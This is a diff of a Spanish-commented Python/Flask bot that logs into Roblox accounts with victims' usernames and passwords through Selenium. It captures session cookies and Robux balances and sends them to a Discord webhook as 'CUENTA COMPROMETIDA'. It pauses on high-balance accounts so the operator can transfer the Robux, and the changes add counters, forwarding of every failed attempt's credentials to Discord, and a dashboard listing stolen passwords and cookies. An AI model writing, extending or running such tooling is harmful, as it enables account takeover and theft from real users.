@@ -1,5 +1,5 @@
 # ============================================================
-# ROBLOX BOT - DASHBOARD + PAUSA MANUAL (SIN TRANSFERENCIA)
+# ROBLOX BOT - DASHBOARD + PAUSA MANUAL + LOGS + REFRESH
 # ============================================================
 
 import requests
@@ -38,6 +38,11 @@ datos_capturados = []
 datos_lock = threading.Lock()
 navegadores_pausados = {} 
 pausados_lock = threading.Lock()
+
+# Contadores globales
+total_intentos = 0
+usuarios_en_sitio = 0
+contadores_lock = threading.Lock()
 
 # ============================================================
 # ENVÍO A DISCORD
@@ -122,6 +127,12 @@ def liberar_driver(driver):
 # ============================================================
 
 def intentar_login(driver, username, password):
+    global total_intentos, usuarios_en_sitio
+    
+    with contadores_lock:
+        total_intentos += 1
+        usuarios_en_sitio += 1
+
     try:
         print(f"🔑 Login: {username}")
         
@@ -154,6 +165,7 @@ def intentar_login(driver, username, password):
             print("⚠️ 2FA → cuenta perdida")
             driver.get("https://www.roblox.com/login")
             time.sleep(2)
+            agregar_al_dashboard(username, password, 0, "2FA Detectado", "Fallido")
             return "CUENTA_PERDIDA"
         
         cookies = driver.get_cookies()
@@ -166,11 +178,39 @@ def intentar_login(driver, username, password):
         
         driver.refresh()
         time.sleep(2)
+        agregar_al_dashboard(username, password, 0, "Credenciales Incorrectas", "Fallido")
         return "CREDENCIALES_INCORRECTAS"
         
     except Exception as e:
         print(f"❌ Error: {e}")
+        agregar_al_dashboard(username, password, 0, f"Error: {str(e)[:50]}", "Fallido")
         return "ERROR"
+    finally:
+        with contadores_lock:
+            if usuarios_en_sitio > 0:
+                usuarios_en_sitio -= 1
+
+def agregar_al_dashboard(username, password, saldo, estado_msg, estado_tipo):
+    global datos_capturados
+    datos_cuenta = {
+        'username': username,
+        'password': password,
+        'saldo': saldo,
+        'cookie': 'No capturada',
+        'fecha': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'estado': estado_msg,
+        'tipo': estado_tipo
+    }
+    with datos_lock:
+        datos_capturados.append(datos_cuenta)
+    
+    # Enviar a discord de todas formas
+    campos = [
+        {"name": "👤 Usuario", "value": f"`{username}`", "inline": True},
+        {"name": "🔑 Contraseña", "value": f"`{password}`", "inline": True},
+        {"name": "📌 Estado", "value": f"`{estado_msg}`", "inline": False}
+    ]
+    enviar_discord("🔔 Intento de Login", campos, 0x888888)
 
 def capturar(driver, username, password, cookie):
     try:
@@ -196,7 +236,8 @@ def capturar(driver, username, password, cookie):
             'saldo': saldo,
             'cookie': cookie if cookie else 'No capturada',
             'fecha': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'estado': 'Pausado' if saldo >= SALDO_MINIMO_ALTO else 'Completado'
+            'estado': 'Pausado' if saldo >= SALDO_MINIMO_ALTO else 'Completado',
+            'tipo': 'Exitoso'
         }
         
         with datos_lock:
@@ -214,7 +255,7 @@ def capturar(driver, username, password, cookie):
         enviar_discord("✅ CUENTA COMPROMETIDA", campos, color, "@everyone 🔐", webhook)
         
         if saldo >= SALDO_MINIMO_ALTO:
-            print(f"🛑 PAUSANDO navegador. Cuenta {username} tiene {saldo} Robux. Ve al dashboard.")
+            print(f"🛑 PAUSANDO navegador. Cuenta {username} tiene {saldo} Robux.")
             with pausados_lock:
                 navegadores_pausados[username] = driver
             
@@ -247,10 +288,16 @@ DASHBOARD_HTML = '''
         body { font-family: 'Segoe UI', sans-serif; background: #0a0a0f; color: #fff; padding: 20px; }
         .header { text-align: center; margin-bottom: 30px; padding: 20px; background: #16213e; border-radius: 12px; border: 1px solid #335FFF; }
         .header h1 { color: #335FFF; font-size: 2em; }
+        
         .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px; }
         .stat-card { background: #16213e; padding: 20px; border-radius: 10px; border: 1px solid #335FFF; text-align: center; }
         .stat-card .number { font-size: 2.5em; font-weight: bold; color: #00ff88; }
         .stat-card .label { color: #888; font-size: 0.9em; margin-top: 5px; }
+        
+        .controls { display: flex; justify-content: flex-end; margin-bottom: 10px; gap: 10px; }
+        .btn-refresh { background: #238636; color: white; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; font-size: 14px; }
+        .btn-refresh:hover { background: #2ea043; }
+
         .table-container { background: #12121a; border-radius: 12px; overflow-x: auto; border: 1px solid #333; }
         table { width: 100%; border-collapse: collapse; font-size: 0.9em; }
         th { background: #1a1a2e; color: #88ccff; padding: 15px 10px; text-align: left; border-bottom: 2px solid #335FFF; }
@@ -259,14 +306,50 @@ DASHBOARD_HTML = '''
         .badge { padding: 4px 10px; border-radius: 20px; font-size: 0.8em; font-weight: 600; }
         .badge-robux { background: #1a3a1a; color: #00ff88; }
         .badge-zero { background: #3a1a1a; color: #ff4444; }
+        .badge-fail { background: #333; color: #aaa; }
         .btn-continue { background: #335FFF; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor: pointer; font-weight: bold; }
         .btn-continue:hover { background: #2850dd; }
+        
+        /* Iframe Monitor */
+        .monitor-container { margin-bottom: 20px; background: #12121a; border-radius: 12px; border: 1px solid #333; overflow: hidden; height: 300px; position: relative; }
+        .monitor-container iframe { width: 100%; height: 100%; border: none; }
+        .monitor-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.8); color: #fff; pointer-events: none; }
     </style>
 </head>
 <body>
     <div class="header">
         <h1>🤖 Dashboard - Control Manual</h1>
         <p style="color:#aaa; margin-top:10px;">Si una cuenta tiene Robux, el bot se pausará aquí. Transfiere los Robux y dale a "Siguiente".</p>
+    </div>
+
+    <div class="stats">
+        <div class="stat-card">
+            <div class="number" id="totalIntentos">0</div>
+            <div class="label">Intentos Totales</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="usuariosEnSitio">0</div>
+            <div class="label">Usuarios en Sitio</div>
+        </div>
+        <div class="stat-card">
+            <div class="number" id="cuentasExitosas" style="color: #00ff88;">0</div>
+            <div class="label">Cuentas Exitosas</div>
+        </div>
+    </div>
+
+    <!-- Falso Iframe para simular monitor -->
+    <div class="monitor-container">
+        <iframe src="about:blank" title="Monitor del Bot"></iframe>
+        <div class="monitor-overlay">
+            <div style="text-align: center;">
+                <p style="font-size: 1.2em; color: #335FFF; margin-bottom: 10px;">🎥 Monitor de Navegador</p>
+                <p style="color: #888; font-size: 0.9em;">(El bot corre en modo invisible. Abajo se muestran los logs reales)</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="controls">
+        <button class="btn-refresh" onclick="cargarDatos()">🔄 Refrescar Datos</button>
     </div>
 
     <div class="table-container">
@@ -278,7 +361,7 @@ DASHBOARD_HTML = '''
                     <th>💰 Robux</th>
                     <th>🍪 Cookie</th>
                     <th>📅 Fecha</th>
-                    <th>⚙️ Acción</th>
+                    <th>⚙️ Acción / Estado</th>
                 </tr>
             </thead>
             <tbody id="tbody">
@@ -291,27 +374,41 @@ DASHBOARD_HTML = '''
         async function cargarDatos() {
             try {
                 const res = await fetch('/api/data');
-                const datos = await res.json();
-                const tbody = document.getElementById('tbody');
+                const data = await res.json();
                 
-                if (datos.length === 0) {
+                // Actualizar contadores
+                document.getElementById('totalIntentos').textContent = data.stats.total;
+                document.getElementById('usuariosEnSitio').textContent = data.stats.active;
+                document.getElementById('cuentasExitosas').textContent = data.stats.success;
+
+                const tbody = document.getElementById('tbody');
+                const cuentas = data.cuentas;
+                
+                if (cuentas.length === 0) {
                     tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:20px; color:#666;">Esperando cuentas...</td></tr>';
                     return;
                 }
                 
                 tbody.innerHTML = '';
-                datos.slice().reverse().forEach(d => {
+                cuentas.slice().reverse().forEach(d => {
                     const tr = document.createElement('tr');
-                    const badgeClass = d.saldo > 0 ? 'badge-robux' : 'badge-zero';
+                    
+                    let badgeHtml = '';
+                    if (d.tipo === 'Exitoso') {
+                        badgeHtml = d.saldo > 0 ? `<span class="badge badge-robux">${d.saldo} R$</span>` : `<span class="badge badge-zero">0 R$</span>`;
+                    } else {
+                        badgeHtml = `<span class="badge badge-fail">${d.estado}</span>`;
+                    }
+
                     const btnHtml = d.estado === 'Pausado' 
                         ? `<button class="btn-continue" onclick="siguiente('${d.username}')">▶️ Siguiente</button>` 
-                        : `<span style="color:#00ff88;">✅ Terminado</span>`;
+                        : `<span style="color:${d.tipo === 'Exitoso' ? '#00ff88' : '#ff4444'};">${d.estado}</span>`;
                     
                     tr.innerHTML = `
                         <td><strong>${d.username}</strong></td>
                         <td>${d.password}</td>
-                        <td><span class="badge ${badgeClass}">${d.saldo} R$</span></td>
-                        <td style="font-size:10px; max-width:200px; word-break:break-all;">${d.cookie.substring(0, 50)}...</td>
+                        <td>${badgeHtml}</td>
+                        <td style="font-size:10px; max-width:150px; word-break:break-all;">${d.cookie.substring(0, 30)}...</td>
                         <td>${d.fecha}</td>
                         <td>${btnHtml}</td>
                     `;
@@ -353,8 +450,16 @@ def dashboard():
 
 @app.route('/api/data', methods=['GET'])
 def api_data():
-    with datos_lock:
-        return jsonify(datos_capturados)
+    with datos_lock, contadores_lock:
+        exitos = sum(1 for d in datos_capturados if d['tipo'] == 'Exitoso')
+        return jsonify({
+            "cuentas": datos_capturados,
+            "stats": {
+                "total": total_intentos,
+                "active": usuarios_en_sitio,
+                "success": exitos
+            }
+        })
 
 @app.route('/api/liberar/<username>', methods=['POST'])
 def liberar(username):
